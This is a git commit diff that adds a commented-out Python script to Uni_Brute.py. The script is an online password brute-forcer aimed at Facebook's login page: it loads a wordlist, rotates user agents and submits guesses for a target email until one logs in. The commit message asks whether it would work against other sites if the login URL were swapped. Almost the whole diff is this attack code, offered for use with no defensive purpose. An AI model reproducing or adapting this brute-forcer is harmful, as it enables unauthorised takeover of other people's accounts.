8a5cd16b526c116a636b79407b079d413185d31b
brut0s <brut0s@users.noreply.github.com>
2017-01-31 20:59:42 -0800

    Update Uni_Brute.py
    hey would this work line#115-193 got the souce code from fb.py script for buteforcing, but do you think it would work if we just change the source login page??????

--- Uni_Brute.py
+++ Uni_Brute.py
@@ -110,14 +110,87 @@ url_to_scrape = raw_input("Enter The Targets Source Account, via Website: ")
 
 #lines of code from 102-110 is a website crawler for scaping, printing out, and confirming the login page of site, still working on it
 
-
-
-
-
-
 print("Ok Now We Have The Target's Source ")
 
-
-
+#passwordlist = str(raw_input("Enter the name of the password list file : "))
+#
+#login = 'https://www.facebook.com/login.php?login_attempt=1'
+#def attack(password):
+#  
+#  try:
+#     sys.stdout.write("\r[*] trying %s.. " % password)
+#     sys.stdout.flush()
+#     br.addheaders = [('User-agent', random.choice(useragents))]
+#     site = br.open(login)
+#     br.select_form(nr=0)
+#  
+#        
+#     ##Souce
+#     br.form['email'] =email
+#     br.form['pass'] = password
+#     br.submit()
+#     log = br.geturl()
+#     if log != login:
+#        print "\n\n\n [*] Password found .. !!"
+#        print "\n [*] Password : %s\n" % (password)
+#        sys.exit(1)
+#  except KeyboardInterrupt:
+#        print "\n[*] Exiting program .. "
+#        sys.exit(1)
+#  
+#def search():
+#    global password
+#    for password in passwords:
+#        attack(password.replace("\n",""))
+#  
+#  
+#  
+#def check():
+#  
+#    global br
+#    global passwords
+#    try:
+#       br = mechanize.Browser()
+#       cj = cookielib.LWPCookieJar()
+#       br.set_handle_robots(False)
+#       br.set_handle_equiv(True)
+#       br.set_handle_referer(True)
+#       br.set_handle_redirect(True)
+#       br.set_cookiejar(cj)
+#       br.set_handle_refresh(mechanize._http.HTTPRefreshProcessor(), max_time=1)
+#    except KeyboardInterrupt:
+#       print "\n[*] Exiting program ..\n"
+#       sys.exit(1)
+#    try:
+#       list = open(passwordlist, "r")
+#       passwords = list.readlines()
+#       k = 0
+#       while k < len(passwords):
+#         passwords[k] = passwords[k].strip()
+#          k += 1
+#    except IOError:
+#        print "\n [*] Error: check your password list path \n"
+#        sys.exit(1)
+#    except KeyboardInterrupt:
+#        print "\n [*] Exiting program ..\n"
+#        sys.exit(1)
+#    try:
+#        print GHT
+#        print " [*] Account to crack : %s" % (email)
+#        print " [*] Loaded :" , len(passwords), "passwords"
+#        print " [*] Cracking, please wait ..."
+#    except KeyboardInterrupt:
+#        print "\n [*] Exiting program ..\n"
+#        sys.exit(1)
+#    try:
+#        search()
+#        attack(password)
+#    except KeyboardInterrupt:
+#        print "\n [*] Exiting program ..\n"
+#        sys.exit(1)
+#  
+#if __name__ == '__main__':
+#    check()
+#
 
 
